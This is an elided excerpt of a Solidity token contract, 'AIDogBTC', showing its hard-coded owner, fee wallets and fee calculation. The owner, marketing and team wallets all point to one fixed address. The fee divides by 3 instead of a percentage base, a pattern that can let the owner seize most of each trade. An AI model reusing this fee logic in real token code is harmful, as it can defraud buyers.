...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xE0BA2b2196FAA8B24B3b7f9aE18E5f0e00A39776; // owner address
...
contract AIDogBTC is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AIDogBTC";
    string private _symbol = "AIDogBTC";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xE0BA2b2196FAA8B24B3b7f9aE18E5f0e00A39776); // Marketing Address
    address payable public teamWalletAddress = payable(0xE0BA2b2196FAA8B24B3b7f9aE18E5f0e00A39776); // Team Address
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(3);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(3);
        }
